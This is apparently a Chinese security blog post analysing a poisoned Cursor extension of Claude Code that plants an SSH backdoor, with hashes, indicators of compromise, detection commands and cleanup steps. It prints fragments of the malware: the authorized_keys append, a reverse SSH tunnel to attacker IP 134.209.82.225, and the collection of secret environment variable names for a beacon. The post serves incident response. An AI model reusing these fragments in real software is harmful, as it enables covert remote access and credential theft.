官方扩展被投毒：Claude Code 在 Cursor 插件市场的一天，和那个把自己写坏的 SSH 后门

2026-10-31
  • 供应链攻击
  • IDE安全
  • SSH后门
  • 持久化
  • 应急响应

10 月 29 日，太平洋时间凌晨 2:27 到下午 1:35，大约 11 个小时里，Cursor 插件市场上的 Anthropic.claude-code 是被人改过的版本。两个版本号：2.1.312、2.1.313。影响范围只说 macOS 和 Windows。

这件事值得单独写一篇，不是因为它"又一次供应链攻击"，而是因为它把一个平时被忽略的事实摊开了：装一个官方插件，等于把 ~/.ssh/authorized_keys 的写权限交出去。插件跑在 IDE 的进程里，用的是你本人的权限，签名是真的，发布者是"官方"，然而它可以在你打开编辑器的瞬间做事，不需要你点任何一个按钮。

第二天 Cursor 出了正式安全公告，安全厂商 Phorion 出了代码级分析。两边数据在关键处能对上，我按代码路径把它拆一遍。

它到底在扩展包里塞了什么

被改的是 extension.js。手法很朴素：在压缩后的扩展包最前面，前置了一段立即执行函数（IIFE）。后面原样的 Claude Code 代码、activate / deactivate 导出、UI 逻辑全都在，diff 一眼看不出毛病。

这段前缀引入了 child_process、fs、os、path、http、crypto 六个 Node 内置模块。关键在于执行时机：只要 Node 加载这个文件，它就运行。不是 activate() 被调用时才跑，是加载即跑，早于扩展自己的启动逻辑。

按 Cursor 公告给出的 I/O 指标，投毒后 extension.js 的 SHA-256 是：

ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15

整体 VSIX 包的哈希分两个版本、两个平台给出了四个值，比如 2.1.313 darwin-arm64 是 80402fdcad8799285fd93044976973ca000da7995fb93363f819bb8e4f84ee6c。排查可疑安装包时用 VSIX 那组，比对 extension.js 时用上面这个。

四个动作，按顺序看清楚

第一步：往 authorized_keys 塞公钥

创建一个攻击者控制的 Ed25519 公钥，追加到 ~/.ssh/authorized_keys，目录设 0700、文件设 0600。公钥的注释字段是 svc-telemetry，伪装成一个遥测服务。

这里有个检测上的细节值得记住。代码在追加前是这么判断的：

if (cur.indexOf("svc-telemetry") < 0) {
  fs.appendFileSync(ak, PUB + "\n");
}

它找的是注释字符串，不是公钥本身。所以你在主机上 grep svc-telemetry 能命中，但如果攻击者下次换一个注释（比如 svc-metrics），这个 grep 就漏了。真正可靠的判断依据是公钥指纹：

SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk

指纹不随注释变。猎的时候两条都要跑：注释做快速筛选，指纹做确认。

另一个细节：它用 fs.appendFileSync 直接写文件，没走 echo、tee 之类的 shell 命令。所以那些监控"shell 命令是否碰过 authorized_keys"的规则一条都不会响。要抓这个，必须落在文件修改遥测上，而且得关注写入进程是谁：Code Helper、Cursor Helper 这类 IDE 的扩展宿主进程，不应该在后台改 SSH 认证文件。

第二步：把它自己的漏洞写出来

拿到公钥之后，理想情况是确保 sshd 在跑。三个平台的代码路径完全不同：

平台 手法
Linux systemctl enable/start sshd 或 ssh，失败退回 service 和 /etc/init.d/
macOS 先 systemsetup -getremotelogin 判断，输出含 Off 才执行 sudo -n systemsetup -setremotelogin on
Windows 用 PowerShell 安装并启动 OpenSSH Server

三步都没有提权利用，sudo -n 在普通用户下没缓存、没配置免密时必然失败。所以"能不能真登进来"这一环，多数情况下是断的。

但 macOS 那条路径断得更早，而且断得很有意思。看这段：

else if (PLAT === "darwin") {
  var rl = ex("systemsetup -getremotelogin 2>/dev/null", 4000);
  d.remoteLogin = rl;
  if (/Off/i.test(rl)) {
    det("sudo -n systemsetup -setremotelogin on >/dev/null 2>&1");
    d.remoteLoginOn = "tried";
  }
}

用普通用户身份跑 systemsetup -getremotelogin，macOS 根本不给读，直接往 stdout 打一句：

You need administrator access to run this tool... exiting!

退出码是 0。ex() 这个 helper 只取 stdout：

function ex(c, t) {
  try {
    return cp.execSync(c, {
      timeout: t || 3000,
      stdio: ["ignore", "pipe", "ignore"],
      windowsHide: true
    }).toString().trim();
  } catch (e) {
    return "";
  }
}

于是 rl 里是那句报错，/Off/i.test(rl) 为 false，if 分支整个跳过。脚本的潜台词变成了："我没权限判断 SSH 是不是关的，那就当它是开着的。"

后果挺讽刺。如果这台 Mac 本来就没开远程登录，攻击者那条反向隧道连得出去，但隧道把流量转发回 localhost:22 时，端口是关的。Cursor 公告里也确认了这一点：除非以管理员身份启动 Cursor，否则这一步大概率失败。

这里有个反直觉的地方。这套代码之所以没造成更大破坏，是因为它自己写错了，不是因为市场审核拦住了它，也不是因为某个安全机制生效了。防护判断绝不能建立在这个 bug 上。如果受害者本来就开着远程登录，或者事后自己开了，后门就现成地躺在那里。

再补一刀：因为 -setremotelogin on 那条命令被跳过，你在进程遥测里根本看不到任何"试图开 SSH"的痕迹。按"有没有执行开启 SSH 的命令"来写检测规则，在这个样本上是零覆盖。

Windows 也有一处同样的低级错误。持久化走 det() 这个 helper，而 det() 里硬编码了 /bin/sh。标准 Windows 上没有这个路径，这条分支直接哑火。

第三步：反向隧道

这才是这个后门真正的主体。细节上区分两把钥匙，排查时非常容易搞混：

  • svc-telemetry（公钥）：在受害机的 ~/.ssh/authorized_keys 里，让攻击者能登进你的机器。
  • svc-telemetry-tun（私钥）：内嵌在载荷里，让你的机器能连出去到攻击者的隧道服务器。

第二把私钥被写到临时目录，文件名是 .stk_ 加 MD5(hostname + HOME) 的前 10 个十六进制字符：

var kf = path.join(
  TMP,
  ".stk_" + crypto.createHash("md5")
    .update(String(os.hostname()) + HOME).digest("hex").slice(0, 10)
);

文件名里带主机指纹，说明这套东西是批量投放的，不是针对单台机器定制。

隧道参数：

ssh -R '*:0:localhost:22' \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o BatchMode=yes -o IdentitiesOnly=yes \
    -o ServerAliveInterval=30 -o ServerAliveCountMax=3 \
    -o ExitOnForwardFailure=yes \
    -i <stk_file> tunnel@134.209.82.225

-R *:0:localhost:22 里的 0 是关键：让攻击者的 SSH 服务端动态分配一个监听端口，凡打到那个端口的流量，全部回灌到受害机的 22。攻击者事后单独连自己服务器的那个端口，用第一阶段埋的公钥认证到受害机的 sshd，拿到完整的交互式 shell 和文件传输能力。

整个反向 shell 不需要载荷本身维持任何 C2 通道。JS 只负责把隧道拉起来，后面全走标准 SSH。这也解释了为什么 -N 出现：不执行远端命令，纯粹占住端口转发。

如果装了 autossh 就用它，没有就退回 ssh，外面套一层 60 秒重试的 detached 循环，用 pgrep 防止重复起隧道。因为循环是脱离的，你关掉 IDE，隧道还在。

第四步：持久化和侦察

持久化三个平台各写各的：

平台 产物 机制
macOS ~/Library/LaunchAgents/com.apple.sysmond.plist LaunchAgent 跑 /bin/sh ~/.config/.smt，RunAtLoad + KeepAlive 都为 true
Linux ~/.config/.smt、~/.config/.smtk + crontab 写 @reboot 条目
Windows ~/.config/smt.cmd + 计划任务 SysMon 试图以 SYSTEM 运行，失败退回 Startup 文件夹

com.apple.sysmond 这个 Label 是刻意选的，跟苹果自家的 sysmond 混淆。但有一个反驳的硬指标：它躺在 ~/Library/LaunchAgents/，不是 /Library/LaunchDaemons/，而且跑在用户上下文，不以 root 起。真正的苹果系统组件不会这么放。检测规则写"非苹果签名的进程往 LaunchAgents 里写 com.apple.* 的 plist"，几乎零误报。

最后一步是侦察上报，一个 JSON POST 打到 134.209.82.225:8099/beacon：

  • 主机名、用户名、OS、架构
  • home 目录、当前工作目录、git config --global user.email
  • 公网 IP（查 ifconfig.me，失败退 api.ipify.org）
  • 各阶段的状态标志：SSH 密钥加没加上、哪种持久化生效了
  • 最多 40 个环境变量的名字，匹配 /KEY|TOKEN|SECRET|PASS|AWS|GCP/i
Object.keys(process.env)
  .filter(function (k) {
    return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k);
  })
  .slice(0, 40)

这里要说清楚，免得被误读成"凭据没泄露"：它只发了变量名，没发值。但从攻击者视角这已经够用了，等于拿到了一份"这台机器上有哪些云凭据"的清单，用来排优先级。真正的值不用偷，等第二步的 SSH 通了，直接读 ~/.aws/credentials 就行。Cursor 公告里那句话说得对：环境变量的有限采集，不能排除后续通过后门访问凭据。

顺带一个说不通的地方：它同时往 134.209.82.225:8099 和 127.0.0.1:8099 都发了 beacon。本机那个端口它自己没监听，样本里也看不出用途，可能是开发残留。

版本号的取证价值

我拉了 Open VSX 的版本列表，截至现在是这样：

2.1.316, 2.1.314, 2.1.312, 2.1.311, 2.1.310, ...

没有 2.1.313。微软市场和 npm 上同样越过了 2.1.313：npm 的 2.1.312 发布于 10 月 27 日 18:36 UTC，2.1.314 发布于 10 月 30 日 00:12 UTC，中间没有 313。

这给了一个很快的自检方法：任何一台机器上如果装着 2.1.313，它一定不是从这些公共仓库拿到的。正常发布流程不会留一个号段缺口给自己。

顺带澄清一个早期误报：最初有报道说投毒包来自 Open VSX，后来被 The Hacker News 和 OpenSourceMalware 更正为 Cursor 自己的市场。这条更正很重要，因为它直接决定了"我该查哪个编辑器的扩展目录"。

自己动手查一遍

先查你有没有中招，一条命令：

grep -qs svc-telemetry ~/.ssh/authorized_keys \
  && echo "命中：svc-telemetry 公钥存在" \
  || echo "未命中"

但 grep 注释不够，还要看指纹和文件的 mtime：

ssh-keygen -lf ~/.ssh/authorized_keys 2>/dev/null | grep -i 0Z6R
ls -l ~/.ssh/authorized_keys

再查持久化和隧道进程：

ls -la ~/Library/LaunchAgents/com.apple.sysmond.plist ~/.config/.smt ~/.config/.smtk 2>/dev/null
ls -la "${TMPDIR}".stk_* 2>/dev/null
pgrep -af 'autossh|ssh.*134\.209\.82\.225'

Linux 上加一条查 crontab：

crontab -l 2>/dev/null | grep -n '\.config/\.smt'

还有一个经常被忽略的点：SSH 日志里，从隧道进来的登录看起来是来自 localhost。因为入口是端口转发，验证时用 svc-telemetry 那把钥匙认证。所以别只筛公网 IP，要在 journalctl -u sshd 或 /var/log/auth.log 里找 Accepted publickey 且来源是 127.0.0.1 或 ::1 的记录，再比对密钥指纹。

卸载不等于清除

这是整件事里最容易被做错的一步。插件只是投递车，它落地的东西全在扩展目录之外：

  • ~/.ssh/authorized_keys 里的公钥
  • ~/Library/LaunchAgents/com.apple.sysmond.plist（或 Linux 的 crontab、Windows 的计划任务）
  • ~/.config/.smt 和 .smtk
  • 临时目录里 .stk_*
  • 那个 detached 的 ssh 重试循环

Cursor 提供了一个 macOS 修复脚本 remediate-macos.sh，要求以受影响用户的身份跑，不是 root；Windows 是 remediate-windows.ps1，需要管理员 PowerShell。两个脚本在还有残留时返回非零退出码，这点设计得不错，能当自动化校验。

Linux 没有官方脚本，得手工清：

# 1. 干掉隧道
pkill -f 'autossh|134\.209\.82\.225'

# 2. 清持久化
crontab -l | grep -v '\.config/\.smt' | crontab -
rm -f ~/.config/.smt ~/.config/.smtk "${TMPDIR}".stk_*

# 3. 清公钥，注意只删那一行
sed -i.bak '/svc-telemetry/d' ~/.ssh/authorized_keys

最后一步的 sed 建议先备份再删，别让整行匹配顺手把别的 key 带走。删完 ssh-keygen -lf 再核一遍指纹，确认那把 key 真的没了。

如果确认有外部登录进来的痕迹，别省事：这台机器上所有能读到的凭据都当作已泄露，从一台干净机器上轮换，包括 aws/gcp 的 key、~/.npmrc、~/.git-credentials、各种 CI token。这种事没有"大概没被读"的中间状态。

一个开发者的视角

三件事我会记下来。

第一，插件的权限模型就是没有模型。 VS Code 的扩展宿主进程继承你的全部权限，能读能写能执行，签名和发布者只证明"包没在传输中被改"，不证明"包里的代码是良性的"。这次是官方包被改，下次可能是官方包自己加了个"遥测"。我本地现在把扩展市场改成手动更新，也不再用"官方发布"当信任理由。

第二，异地登录检测要把 127.0.0.1 当可疑来源。 反向隧道把外部访问伪装成本地回环，这是 sshd 日志里最容易蒙混的一类。之前我排查登录只看公网源 IP，这条规则得改。

第三，私有部署的插件市场该有哈希白名单。 团队内部完全可以做一个简单的版本钉扎：anthropic.claude-code 只允许白名单里的 VSIX 哈希，装到列表外的版本直接告警。这次的 ecb58cb2... 一个哈希就能拦住，成本很低。做法不需要什么平台，一个遍历扩展目录比对 package.json 版本号和 VSIX 哈希的脚本，挂在 CI 或每天的巡检任务里就够。

最后留一句话：这次攻击者的代码在 macOS 上把自己写崩了，靠的是它漏了 systemsetup 需要管理员权限。这种事不能当作常态，正常的攻击者写两版就修好了。
